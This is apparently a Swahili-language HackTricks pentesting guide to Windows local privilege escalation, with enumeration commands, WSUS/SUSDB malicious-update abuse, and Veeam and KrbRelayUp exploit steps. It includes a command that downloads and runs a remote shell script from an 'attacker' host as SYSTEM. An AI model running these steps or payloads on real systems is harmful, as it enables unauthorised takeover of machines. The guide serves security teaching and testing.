# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora zaidi la kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unaunganisha mbinu za jumla za Windows privilege escalation kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mtiririko wake wa vitendo wa enumeration pia unatokana na warsha na orodha za ukaguzi za jamii.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Maudhui ya kihistoria kuhusu mashambulizi yanajumuisha wasilisho la DerbyCon kuhusu Windows privilege escalation.<sup>[[5]](#references)</sup>

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui access tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels katika Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna vitu mbalimbali katika Windows vinavyoweza **kukuzuia kufanya enumeration ya mfumo**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na kufanya **enumeration** ya **mbinu** hizi zote za **ulinzi** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili unaweza pia kubadilisha uhariri wa UEFI NVRAM ukiwa nje ya mtandao kuwa DMA kabla ya kuwasha, kisha kuunda mnyororo wa kurekebisha kumbukumbu ya Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

Michakato ya UIAccess inayoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa kufikia High IL bila maonyo wakati ukaguzi wa secure-path wa AppInfo umepitwa. Tazama mtiririko maalum wa UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Usambazaji wa registry wa ufikivu wa Secure Desktop unaweza kutumiwa kuandika thamani yoyote ya registry kwa SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Build za hivi karibuni za Windows pia zimeleta njia ya LPE inayotumia **SMB arbitrary-port**, ambapo uthibitishaji wa NTLM wa ndani wenye ruhusa za juu huakisiwa kupitia muunganisho wa SMB TCP uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

Kwa inventory ya ndani kutoka kwenye kikao kilichopo cha PowerShell, tazama [Windows Enumeration with .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Mifano hii inakamilisha ukaguzi ulio hapa chini bila kuanzisha executables tofauti za enumeration.

### Enumeration ya taarifa za toleo

Angalia ikiwa toleo la Windows lina udhaifu wowote unaojulikana (pia kagua patches zilizotumika).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za Version

[Site](https://msrc.microsoft.com/update-guide/vulnerability) hii ni muhimu kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Database hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **attack surface kubwa sana** inayotokana na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyojumuishwa)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa za OS build, updates zilizosakinishwa na advisory candidates zilizochaguliwa; hakikisha product husika na updates zilizochukua nafasi ya nyingine kabla ya kuchukulia matokeo kuwa yanahusika.

Kwa local exploit inayohusu version maalum, angalia **usanifu wa process inayoendeshwa** pamoja na usanifu wa OS. Kwenye Windows ya 64-bit, process ya 32-bit hutumia [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekeza kwenye system directory ya 32-bit, ilhali `%windir%\Sysnative` huipa process hiyo ufikiaji wa system directory asilia. Alias hii haipatikani kwa process ya 64-bit. OS build au candidate ya KB inayokosekana haithibitishi kuwa exploit inaweza kutumika; linganisha build inayoendeshwa, update iliyosakinishwa au iliyochukua nafasi ya nyingine, usanifu wa process na masharti ya exploit na [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) ya suala husika.

Kwa mfano wa service-memory-corruption, angalia [client-controlled MIDI shared-memory ring offsets](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Stack offsets zilizochapishwa zinatumika tu kwa build iliyojaribiwa; kufikia `LOCAL SERVICE` ni hatua tofauti na hatua inayofuata ya [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) ya kufikia `SYSTEM`.<sup>[[44]](#references)</sup>

**Ndani ya mfumo kwa kutumia taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Kuna credential/Juicy info yoyote iliyohifadhiwa kwenye env variables?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuwasha hii katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [Sera ya transcription ya PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huandika ndani ya folda ya Documents ya kila mtumiaji, lakini mipangilio ya `OutputDirectory` au `Start-Transcript -OutputDirectory` inaweza kuelekeza faili kwenye folda iliyoshirikiwa au iliyofichwa. Angalia njia ya output inayotumika na ACL ya faili kabla ya kukagua transcript: inaweza kuwa na hoja za amri na output, ikiwemo credentials. Transcript inayosomeka ni kidokezo tu ikiwa yaliyomo yanafichua utambulisho wa kiwango cha juu zaidi unaoweza kutumika, na utambulisho huo unaweza kuingia katika muktadha husika.

### PowerShell Module Logging

Maelezo ya utekelezaji wa PowerShell pipeline hurekodiwa, yakijumuisha amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, huenda maelezo kamili ya utekelezaji na matokeo ya output yasinaswe.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kuona matukio 15 ya mwisho kutoka kwenye logs za PowersShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script huhifadhiwa, na kuhakikisha kwamba kila block ya code inaandikwa inapoendeshwa. Mchakato huu huhifadhi rekodi ya kina ya ukaguzi wa kila shughuli, ambayo ni muhimu kwa forensics na kuchanganua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato hutolewa.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya Logging ya Script Block yanaweza kupatikana katika Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Viendeshi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Mwongozo wa awali ulifupisha hatari kama ifuatavyo:

Unaweza kuathiri mfumo ikiwa masasisho yanaombwa kwa kutumia http badala ya http**S**.

Endpoint ya WSUS ya HTTP ni dalili ya kuchunguza uwezekano wa kunasa metadata ya masasisho. Unyonyaji pia hutegemea kama mteja anatumia seva hiyo ya WSUS, kama mshambuliaji anaweza kunasa au kudhibiti trafiki yake, na sera za mteja za kuamini na kusakinisha masasisho. URL pekee haithibitishi kuwa code execution inawezekana. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Unaanza kwa kuangalia kama mtandao unatumia sasisho la WSUS lisilo la SSL, kwa kuendesha yafuatayo kwenye cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipata jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Kauli ya awali kuhusu utumikaji ilikuwa:

Basi, **inaweza kutumiwa vibaya.** Ikiwa thamani ya mwisho ya registry ni sawa na 0, basi ingizo la WSUS litapuuzwa.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intranet iliyosanidiwa. Hii inathibitisha sharti la awali kwa njia ya HTTP interception, lakini haithibitishi kuwa interception, kukubaliwa kwa malicious update, au usakinishaji wenye ruhusa za juu unawezekana. Ikiwa ni `0`, endpoint hii maalum ya WSUS iliyosanidiwa haichaguliwi na policy hiyo.

Ili kutumia vibaya vulnerabilities hizi, unaweza kutumia tools kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za MiTM weaponized exploits za kuingiza updates 'fake' kwenye trafiki ya WSUS isiyotumia SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, hii ndiyo dosari inayotumiwa vibaya na bug hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates hutumia proxy iliyosanidiwa kwenye mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya mashine yetu ili kuzuia trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye ruhusa za juu kwenye mfumo wetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, pia itatumia certificate store yake. Tukitengeneza certificate iliyojisaini kwa hostname ya WSUS na kuongeza certificate hii kwenye certificate store ya mtumiaji wa sasa, tutaweza kuzuia trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mifumo kama HSTS kutekeleza uthibitishaji wa trust-on-first-use kwenye certificate. Ikiwa certificate iliyowasilishwa inaaminika na mtumiaji na ina hostname sahihi, huduma itaikubali.

Unaweza kutumia vibaya vulnerability hii kwa kutumia tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (itakapotolewa).

### Updates zinazodhibitiwa na msimamizi wa WSUS

Kuna njia tofauti pale utambulisho wa sasa unapoweza **kuchapisha na kuidhinisha** updates kwenye server ya WSUS. Kagua uanachama unaotumika kwenye group la `WSUS Administrators` la server na ruhusa zozote za WSUS zilizokasimiwa, kisha tambua group la kompyuta za clients litakalopokea update iliyoidhinishwa. [Microsoft inahitaji ruhusa za WSUS Administrator ili kuidhinisha updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaeleza uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): clients lazima ziwe na uaminifu kwa signing certificate inayotumiwa kwa maudhui yaliyochapishwa ndani ya mfumo. Thibitisha kuwa update husika imesainiwa na kukubaliwa, inatumika kwa target, na imesakinishwa katika muktadha wenye ruhusa za juu zaidi kabla ya kuchukulia hili kama njia ya privilege escalation. Thamani ya HTTP `WUServer` au jina la group pekee havithibitishi masharti hayo.

### Matumizi mabaya ya custom updates za SUSDB: unsigned payloads kupitia `.txt`/`.esd`

Huu ni ukiukaji tofauti wa mpaka wa uaminifu na kuingilia muunganisho wa HTTP wa WSUS: sharti la awali ni kuwa na ufikiaji wa kutosha kwa **stored procedures za database ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha custom update. Njia moja ya vitendo ya kupata ufikiaji ni ku-relay akaunti ya kompyuta ya WSUS ya upstream kwenda kwenye server tofauti ya MSSQL inayohost `SUSDB`; sharti halisi hutegemea deployment, kwa hiyo kwanza orodhesha ruhusa za `EXECUTE` badala ya kudhani kuwa haki za SQL administrator zinahitajika.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya shambulio inayorelay uthibitishaji wa WSUS client kutoka HTTP/8530 kwenda LDAP, SMB, au AD CS, tazama [Kutumia vibaya WSUS HTTP kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Thibitisha relay ya database ya nje na ruhusa za procedure

Katika deployments ambapo WSUS hutumia SQL Server ya nje, kwanza kagua ikiwa akaunti ya server ya WSUS inaweza kujithibitisha kwenye database na ikiwa NTLM relay inafika kwenye listener hiyo. SQL role ya server inaweza kutoa uwezo wa kutumia procedures za kuchapisha updates hata pale uandishi wa moja kwa moja kwenye tables umekataliwa; `UPDATE` iliyoshindwa kwenye `SUSDB` haithibitishi kuwa uchapishaji umezuiwa. Kagua utambulisho unaotumika, uanachama wa role, na ruhusa za procedure katika SQL session iliyoidhinishwa kabla ya kujaribu custom update.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Ufafanuzi wa procedures zilizopo na `SoftwareDistributionPackage.xsd` iliyosakinishwa ni muhimu wakati wa kuunda upya metadata halali ya update. Parent ya bundle na child ya payload kila moja zinahitaji `UpdateIdentity` (aina ya fragment `1`), `LocalizedProperties` (`4`), na `ExtendedProperties` (`2`); hifadhi local revision ID inayorejeshwa na kila mwito wa `spImportUpdate`, na hakikisha uhusiano wa bundle, digests, size, content URL, na revision vinaendana. Huu ni mtiririko wa uchapishaji unaohifadhi state, kwa hivyo mwito mmoja tu wa stored procedure uliofanikiwa si uthibitisho kwamba utekelezaji ulifanyika upande wa client.<sup>[[38]](#references)</sup>

#### Unda, lenga na uidhinishe update

Workflow ya custom-update hutumia procedures halali za WSUS kama API yenye vikwazo ya uchapishaji. Mabadiliko muhimu ya state ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Ingiza metadata ya update | `spImportUpdate` |
| Hifadhi fragments za XML za masharti ya awali, maudhui yaliyowekwa lugha maalum na maudhui yaliyopanuliwa | `spSaveXMLFragment` |
| Husisha content digest na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/unda kikundi cha kompyuta na uongeze client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa kikundi hicho | `spDeployUpdate` yenye `@actionID = 0` na `@isAssigned = 1` |

Jina la faili, digests, size na handler ya `CommandLineInstallation` lazima zilingane katika metadata/fragments zilizoingizwa. Baada ya kuweka content URL na target group, idhini ya mwisho hufanana na ifuatayo; tumia vitambulishi vipya vya update, group na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Signature bypass inayotokana na extension

WSUS kwa kawaida hukataa maudhui holela ya executable ambayo hayajasainiwa. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka bendera ya ukaguzi wa cheti kuwa false ikiwa jina la faili lililotolewa linaishia kwa `.txt` au `.esd`; hivyo, `CheckCertificateSignature` hurukwa bila kwanza kuthibitisha kuwa baiti hizo ni maandishi au picha halali ya ESD. Kwa hiyo, PE isiyobadilishwa yenye jina kama `payload.exe.txt` inaweza kupita uthibitishaji wa maudhui na baadaye kuzinduliwa na handler ya usakinishaji wa update ya command-line. Hili ni hitilafu ya kuchanganya sera na aina za data, si kughushi sahihi ya kidijitali.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Uwekaji wa staging na uotomatiki unaoendana na BITS

Kuita `spDeployUpdate` hufanya WSUS ichukue maudhui yaliyosajiliwa. Chanzo lazima kikidhi matarajio ya HTTP ya BITS: kuwa na URL inayofikika pekee hakutoshi, kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Seva isiyounga mkono Range husababisha tukio la usawazishaji la WSUS `EventId=364`, linalosema kuwa BITS inahitaji kichwa cha itifaki ya Range.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) hutengeneza SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, inajumuisha mteja wa MSSQL uliorekebishwa kwa ajili ya kuitekeleza, na huja na `BitsWebServer.py` kwa ajili ya kuweka maudhui. Amri ya chini kabisa ya kutumia katika maabara iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji bila usimamizi na persistence ya majaribio tena

Mwingiliano wa upande wa client hutegemea policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, option `4 - Auto download and schedule install`, husababisha update iliyoidhinishwa kupakuliwa na kusakinishwa kulingana na ratiba iliyosanidiwa bila mtumiaji kuichagua mwenyewe. Katika majaribio, payload ambayo update yake ilibaki katika hali ya kushindwa/kutokamilika ilitolewa tena mara moja baada ya mchakato wa callback kutoka, kwa hiyo tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji unaojirudia; husababisha kelele kwa sababu client huonyesha hali ya update iliyoshindwa.<sup>[[39]](#references)</sup>

#### Njia za kugundua na kuimarisha usalama

Njia muhimu za uchunguzi wa upande wa server na client kutoka kwenye mnyororo huu ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `SUSDB` wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate`; chunguza target groups mpya, vyanzo vya maudhui vya nje, payloads za update za `.txt`/`.esd` na deployments zilizofanywa na principals zisizotarajiwa (hasa akaunti zisizo za kompyuta).
- Kagua `C:\Program Files\Update Services\LogFiles` kwa `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (iliyoandikwa kimakosa), na `EventId=364`; linganisha uthibitishaji na kiendelezi cha payload pamoja na magic ya maudhui badala ya kuamini kiambishi tamati.
- Tafuta usakinishaji wa Windows Update unaoshindwa/kujaribiwa tena mara kwa mara, na utekelezaji wa PE au shughuli zisizotarajiwa za child/network kutoka kwa maudhui yenye majina ya `.txt` au `.esd`.
- Washa Extended Protection for Authentication kwenye database service inapoungwa mkono, na zuia ufikiaji wa mtandao wa database kwa WSUS server na mifumo ya usimamizi iliyoidhinishwa. Punguza na kagua ruhusa za `EXECUTE` kwenye procedures za custom-update.

## Third-Party Auto-Updaters na Agent IPC (local privesc)

Agents wengi wa enterprise hufichua uso wa IPC wa localhost na channel ya update yenye privileges. Ikiwa enrollment inaweza kulazimishwa kuwasiliana na server ya mshambuliaji na updater ikaamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI hasidi ambayo SYSTEM service huisakinisha. Tazama technique ya jumla (iliyotokana na mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Maelezo ya awali yaliyohusu toleo mahususi na dokezo la uchunguzi yalikuwa:

Veeam B&R < `11.0.1.1261` hufichua service ya localhost kwenye **TCP/9401** inayochakata ujumbe unaodhibitiwa na mshambuliaji, na hivyo kuruhusu kutekeleza amri zozote kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: thibitisha listener na toleo, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication na Cloud Connect hutumia core backup service kwenye **TCP/9401 kwa chaguo-msingi**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji usiohitaji uthibitishaji wa credentials zilizosimbwa za configuration-database ndani ya mpaka wa mtandao wa backup; PoC tofauti ya umma inaonyesha njia ya kutekeleza amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Service inaweza kufungamana na anwani nyingine zaidi ya localhost, kwa hiyo kagua anwani na PID yake halisi.

- **Recon**: thibitisha kuwa TCP/9401 inamilikiwa na `Veeam.Backup.Service.exe`, kisha kagua product iliyosakinishwa na metadata ya patch. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patch.
- **Matoleo ya kwanza yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kuwa matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathirika. Toleo la faili lenye sehemu nne pekee haliwezi kutofautisha build ya msingi isiyokuwa na patch na patch ya baadaye kwenye namba hizo hizo za build. Thibitisha kitambulisho cha patch kwa kutumia [historia ya build ya vendor](https://www.veeam.com/kb2680) kabla ya kuhitimisha kuwa build ya mpaka imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika kwenye directory moja, kisha anzisha payload ya SYSTEM kupitia socket ya ndani:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Huduma hutekeleza amri kama SYSTEM.

PoC iliyotajwa inaonyesha utekelezaji wa amri kama SYSTEM wakati masharti yake ya ziada yametimizwa; ushauri wa vendor unaeleza tatizo la kufichuliwa kwa credential.

## KrbRelayUp

Maelezo ya awali kuhusu mazingira chaguomsingi yalikuwa:

Kuna vulnerability ya **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya yanajumuisha mazingira ambayo **LDAP signing haijatekelezwa,** watumiaji wana self-rights zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na wana uwezo wa kuunda kompyuta ndani ya domain. Ni muhimu kutambua kuwa **masharti haya** yanatimizwa kwa kutumia **mipangilio chaguomsingi**.

Uelekezaji upya wa Kerberos wa ndani unaweza kuvuka kutoka kwenye logon yenye ruhusa za chini hadi kwenye uandishi wa directory wenye ruhusa za juu wakati COM server inayofaa inapothibitisha utambulisho na principal inayoelekezwa upya ina ruhusa kwenye object lengwa. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) uandishi wa LDAP wa RBCD na `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp huendesha kiotomatiki baadhi ya njia hizi. Mlolongo wa RBCD unahitaji ruhusa zinazofaa za delegation na za object lengwa, ilhali mlolongo wa shadow-credential unahitaji ruhusa za kuandika key-credential na KDC inayotumia njia ya uthibitishaji wa certificate. Hakuna njia kati ya hizi inayotokana na kuwa mwanachama wa domain pekee.

Kagua sera halisi ya DC kuhusu [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL ya object ya utambulisho unaoelekezwa upya, na viwango vya uthibitishaji na impersonation vya COM class iliyochaguliwa. Aina ya logon ya caller na muktadha wa credential ni muhimu: session ya WinRM inaweza kufanya kazi tofauti na logon ya interactive au ya new-credentials. Uelekezaji wa firewall/OXID na updates zilizosakinishwa pia vinaweza kubadilisha matokeo. Chukulia sera iliyoruhusu au ACL inayolingana kuwa jambo linalopaswa kukaguliwa; enumeration isiyoingilia mfumo haipaswi kuanzisha COM coercion, relay authentication, au uandishi wa directory. Shadow credential ya machine-account inaweza kusababisha machine ticket, na tu ikiwa account hiyo ina ruhusa zinazohitajika za directory replication ndipo inaweza kufuatwa na njia tofauti ya DCSync.

Tafuta **exploit kwenye** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

